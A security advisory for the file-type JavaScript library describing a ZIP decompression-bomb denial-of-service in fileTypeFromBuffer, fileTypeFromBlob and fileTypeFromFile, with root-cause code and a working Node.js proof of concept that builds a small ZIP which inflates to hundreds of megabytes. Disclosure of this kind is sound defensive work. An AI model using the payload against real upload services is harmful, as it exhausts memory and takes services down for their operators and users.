summary: "file-type: ZIP Decompression Bomb DoS via [Content_Types].xml entry\n## Summary\n\n\
  A crafted ZIP file can trigger excessive memory growth during type detection in `file-type`\
  \ when using `fileTypeFromBuffer()`, `fileTypeFromBlob()`, or `fileTypeFromFile()`.\n\nIn\
  \ affected versions, the ZIP inflate output limit is enforced for stream-based detection,\
  \ but not for known-size inputs. As a result, a small compressed ZIP can cause `file-type`\
  \ to inflate and process a much larger payload while probing ZIP-based formats such as OOXML.\
  \ In testing on `file-type` `21.3.1`, a ZIP of about `255 KB` caused about `257 MB` of RSS\
  \ growth during `fileTypeFromBuffer()`.\n\nThis is an availability issue. Applications that\
  \ use these APIs on untrusted uploads can be forced to consume large amounts of memory and\
  \ may become slow or crash.\n\n## Root Cause\n\nThe ZIP detection logic applied different\
  \ limits depending on whether the tokenizer had a known file size.\n\nFor stream inputs, ZIP\
  \ probing was bounded by `maximumZipEntrySizeInBytes` (`1 MiB`). For known-size inputs such\
  \ as buffers, blobs, and files, the code instead used `Number.MAX_SAFE_INTEGER` in two relevant\
  \ places:\n\n```js\nconst maximumContentTypesEntrySize = hasUnknownFileSize(tokenizer)\n\t\
  ? maximumZipEntrySizeInBytes\n\t: Number.MAX_SAFE_INTEGER;\n```\n\nand:\n\n```js\nconst maximumLength\
  \ = hasUnknownFileSize(this.tokenizer)\n\t? maximumZipEntrySizeInBytes\n\t: Number.MAX_SAFE_INTEGER;\n\
  ```\n\nTogether, these checks allowed a crafted ZIP to bypass the intended inflate limit for\
  \ known-size APIs and force large decompression during detection of entries such as `[Content_Types].xml`.\n\
  \n## Proof of Concept\n\n```js\nimport {fileTypeFromBuffer} from 'file-type';\nimport archiver\
  \ from 'archiver';\nimport {Writable} from 'node:stream';\n\nasync function createZipBomb(sizeInMegabytes)\
  \ {\n\treturn new Promise((resolve, reject) => {\n\t\tconst chunks = [];\n\t\tconst writable\
  \ = new Writable({\n\t\t\twrite(chunk, encoding, callback) {\n\t\t\t\tchunks.push(chunk);\n\
  \t\t\t\tcallback();\n\t\t\t},\n\t\t});\n\n\t\tconst archive = archiver('zip', {zlib: {level:\
  \ 9}});\n\t\tarchive.pipe(writable);\n\t\twritable.on('finish', () => {\n\t\t\tresolve(Buffer.concat(chunks));\n\
  \t\t});\n\t\tarchive.on('error', reject);\n\n\t\tconst xmlPrefix = '<?xml version=\"1.0\"\
  ?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">';\n\t\tconst\
  \ padding = Buffer.alloc(sizeInMegabytes * 1024 * 1024 - xmlPrefix.length, 0x20);\n\t\tarchive.append(Buffer.concat([Buffer.from(xmlPrefix),\
  \ padding]), {name: '[Content_Types].xml'});\n\t\tarchive.finalize();\n\t});\n}\n\nconst zip\
  \ = await createZipBomb(256);\nconsole.log('ZIP size (KB):', (zip.length / 1024).toFixed(0));\n\
  \nconst before = process.memoryUsage().rss;\nawait fileTypeFromBuffer(zip);\nconst after =\
  \ process.memoryUsage().rss;\n\nconsole.log('RSS growth (MB):', ((after - before) / 1024 /\
  \ 1024).toFixed(0));\n```\n\nObserved on `file-type` `21.3.1`:\n- ZIP size: about `255 KB`\n\
  - RSS growth during detection: about `257 MB`\n\n## Affected APIs\n\nAffected:\n- `fileTypeFromBuffer()`\n\
  - `fileTypeFromBlob()`\n- `fileTypeFromFile()`\n\nNot affected:\n- `fileTypeFromStream()`,\
  \ which already enforced the ZIP inflate limit for unknown-size inputs\n\n## Impact\n\nApplications\
  \ that inspect untrusted uploads with `fileTypeFromBuffer()`, `fileTypeFromBlob()`, or `fileTypeFromFile()`\
  \ can be forced to consume excessive memory during ZIP-based type detection. This can degrade\
  \ service or lead to process termination in memory-constrained environments.\n\n## Cause\n\
  \nThe issue was introduced in 399b0f1"
